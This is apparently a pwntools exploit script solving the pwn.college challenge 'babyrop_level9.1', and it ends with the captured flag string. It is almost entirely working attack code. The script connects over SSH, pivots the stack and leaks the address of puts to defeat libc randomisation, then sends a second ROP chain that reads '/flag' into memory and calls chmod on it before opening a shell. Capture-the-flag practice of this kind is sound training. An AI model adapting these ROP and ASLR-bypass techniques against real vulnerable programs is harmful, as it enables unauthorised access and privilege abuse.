from pwn import *

elf = context.binary = ELF("./babyrop_level9.1")
libc = ELF("./libc.so.6", checksec=False)
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

pos1 = 0x414080
pop_rdi = 0x0000000000401da3
pop_rsp_pop3 = 0x0000000000401d9d

io = s.process("/challenge/babyrop_level9.1")
io.send(p64(pop_rsp_pop3) + p64(pos1 + 16) + p64(0) * 3 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.entrypoint))

io.recvuntil(b"Leaving!\n")
leak = u64(io.recv(6).ljust(8, b'\x00'))

libc.address = leak - libc.sym['puts']
info("Leak libc: " + hex(libc.address))

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pos2 = elf.bss() + 0x300


chain =  p64(pop_rsp_pop3) + p64(pos1 + 16) + p64(0) * 3
chain += p64(pop_rax) + p64(0)    + p64(pop_rdi) + p64(0)   + p64(pop_rsi) + p64(pos2) + p64(pop_rdx) + p64(0x100) + p64(syscall)
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(pos2) + p64(pop_rsi) + p64(7)   + p64(syscall)
io.send(chain)
io.send(b'/flag\x00')
io.close()

sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{cD9lONzFdUYWJzHZMuokIMuZ6z0.0FO1MDLxIjNyEzW}